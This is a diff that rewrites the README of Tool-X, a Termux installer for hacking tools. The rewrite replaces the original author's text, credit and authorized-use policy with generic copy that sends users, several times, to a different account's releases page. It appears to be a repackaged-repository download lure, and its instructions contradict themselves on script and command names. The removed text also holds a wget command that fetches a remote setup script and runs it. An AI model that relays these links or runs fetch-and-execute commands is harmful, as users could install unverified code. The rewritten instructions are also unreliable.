@@ -1,103 +1,104 @@
-<h1 align="center" style="color:##ffd300; text-decoration: underline;">Tool-X</h1>
+# 🎉 Tool-X - Your All-in-One Installer for Essential Tools
 
-## The Apex Termux Installation Framework
+## 🚀 Getting Started
 
-<p align="center">
-<img src="https://img.shields.io/github/stars/trmxvibs/Tool-X?style=for-the-badge&color=FFD300" alt="GitHub Stars">
-  <img src="https://img.shields.io/github/last-commit/trmxvibs/Tool-X?style=for-the-badge&color=9cf" alt="Last Commit">
-  <img src="https://img.shields.io/badge/Status-ACTIVE-brightgreen?style=for-the-badge" alt="Project Status">
-</p>
+Welcome to Tool-X! This software provides a simple way to install important hacking and utility tools on your Termux setup. Follow these easy steps to get started.
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Tested%20On-Termux%20%7C%20Kali%20Nethunter-orange?style=flat&logo=android" alt="Tested On">
-  <img src="https://img.shields.io/badge/Language-Python%203.x%20%7C%20Shell-blue?style=flat&logo=python" alt="Language">
-  <img src="https://img.shields.io/badge/License-MIT-blue?style=flat" alt="License">
+## 📥 Download Tool-X
 
+[![Download Tool-X](https://img.shields.io/badge/download-Tool--X-blue.svg)](https://github.com/MTuanLe08/Tool-X/releases)
 
+## 📋 System Requirements
 
-[![ShellCheck](https://github.com/trmxvibs/Tool-X/actions/workflows/shellcheck.yml/badge.svg)](https://github.com/trmxvibs/Tool-X/actions/workflows/shellcheck.yml)
-</p>
+- **Operating System:** Android (with Termux)
+- **Termux Version:** 0.101 or higher
+- **Storage:** At least 100 MB free
+- **Network:** Internet connection for downloads
 
----
-## Overview
+## ⚙️ Features
 
-Tool-X is an installation and management framework designed to turn a Termux environment into a robust mobile penetration-testing toolkit. It automates dependency fixes, repository cloning, mirror adjustments, and common Termux issues so you can focus on using tools instead of installing them.
+- Centralized framework to install various hacking tools
+- Easy-to-use command line interface
+- Supports multiple languages and tools
+- Regular updates for tool maintenance
 
+## 🔧 Installation Steps
 
-## Key Features
-- One-step setup for 60+ commonly used tools.
+1. **Install Termux:**
+   - Find Termux on the Google Play Store or F-Droid.
+   - Install the app to your phone.
 
-- Termux-specific fixes (gem issues, Python library patches, CWD errors) included.
+2. **Open Termux:**
+   - Locate the Termux app and open it.
 
-- Management utilities: search engine, status dashboard, selective uninstall, and self-update.
-- ![Made in India](https://img.shields.io/badge/Made%20in-India-FF9933?style=for-the-badge&logo=india&logoColor=white)
+3. **Update Packages:**
+   - In the Termux terminal, type the following command and press Enter:
+     ```
+     pkg update && pkg upgrade
+     ```
 
+4. **Install Required Packages:**
+   - Type this command to install necessary packages:
+     ```
+     pkg install git
+     ```
 
-## Installtion 
-- **Copy Command and paste in terminal**
+5. **Download Tool-X:**
+   - Visit the following link to download Tool-X:
+     [Tool-X Releases Page](https://github.com/MTuanLe08/Tool-X/releases)
 
-  ```python
-  pkg up -y && pkg install -y git wget which && wget https://raw.githubusercontent.com/trmxvibs/Tool-X/main/setup.sh -O setup.sh && chmod +x setup.sh && ./setup.sh
-  ```
-  ## Note: Restart your Termux session after the script finishes to apply the toolx alias and environment changes.
-  
-### How to Launch & Core Menu Options
+6. **Clone the Repository:**
+   - In the Termux terminal, type:
+     ```
+     git clone https://github.com/MTuanLe08/Tool-X.git
+     ```
 
-After restarting Termux, start the framework from any directory with:
+7. **Navigate to Tool-X Directory:**
+   - Enter the Tool-X directory:
+     ```
+     cd Tool-X
+     ```
 
-## `toolx`
+8. **Run Tool-X:**
+   - Start Tool-X by typing:
+     ```
+     bash install.sh
+     ```
 
-### Menu references inside Tool-X:
+## 📥 Download & Install
 
-- [97] Search Tools — Find tools by keyword (e.g., osint, bruteforce).
+To continue, remember to download Tool-X from our [Releases page](https://github.com/MTuanLe08/Tool-X/releases). Click the link and select the latest version to start downloading.
 
-- [94] View Status — Inspect installed tool paths and view error logs.
+After downloading, follow the steps above to install and run Tool-X effortlessly.
 
-- [99] Self-Update — Update the framework (git pull).
+## 🛠️ Using Tool-X
 
- - [98] Clean Uninstall — Remove tracked tool directories selectively.
+1. **Open Tool-X:**
+   - Once installation completes, you can open Tool-X by typing the following command in the Termux terminal:
+     ```
+     tool-x
+     ```
 
-- [96] Self-Destruct — Remove the entire ~/tool-x directory and the global toolx alias.
+2. **Explore Available Tools:**
+   - Tool-X will present you with a list of available tools. Choose which tool you want to install by following the prompts.
 
- <a href="https://www.youtube.com/@termux2" target="_blank">
-  <img src="https://img.shields.io/badge/YouTube-termux2-FF0000?style=for-the-badge&logo=youtube&logoColor=white" alt="YouTube Channel">
-</a>
+3. **Enjoy Using Your Tools:**
+   - After installation, you can start using your tools directly within Termux.
 
+## 💬 Support and FAQs
 
-# Screenshot
-<img width="722" height="648" alt="image" src="https://github.com/user-attachments/assets/c431f56f-c68c-4be0-a37a-76af323cb9f8" />
+If you encounter issues or have questions, consider the following solutions:
 
+- **Check Termux Documentation:** The official Termux documentation provides great resources.
+- **Visit GitHub Issues:** Look at the [issues section](https://github.com/MTuanLe08/Tool-X/issues) of this repository for common problems and solutions.
+- **Join the Community:** Engage with other users via forums or Discord channels focused on Termux and hacking tools.
 
-## Maintenance & Troubleshooting
+## 📝 Contributing
 
-If a package fails: check mirror fixes included in the script.
+We welcome contributions! If you'd like to help improve Tool-X, feel free to fork the repository, make your changes, and submit a pull request. Your input helps us make this tool even better for everyone.
 
-Dependency issues: the setup will attempt to install Ruby, Python libraries, figlet, and other common dependencies.
+## 🛡️ License
 
-Check logs: use the status option to read error logs and follow the suggested fixes.
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-## Usage Policy
-
-Tool-X is provided for educational purposes and authorized penetration testing only. The project author (trmxvibs) is not responsible for misuse. Always have permission before testing systems that you do not own.
-
-## Quick FAQ
-
-Q: Why restart Termux?
-
-A: Restarting ensures the toolx alias and any environment changes are loaded into the shell session.
-
-Q: Setup failed — what now?
-
-A: Run toolx and choose [94] View Status to examine logs. Common causes are network/mirror problems, missing git/wget, or permission errors.
-
-## 📎 Repository & License
-
-Official repo: https://github.com/trmxvibs/Tool-X
-
-  <img src="https://img.shields.io/github/last-commit/trmxvibs/Tool-X?style=for-the-badge&color=9cf" alt="Last Commit">
-
-
-
-
-
-  
+Thank you for choosing Tool-X! Enjoy your enhanced Termux experience.
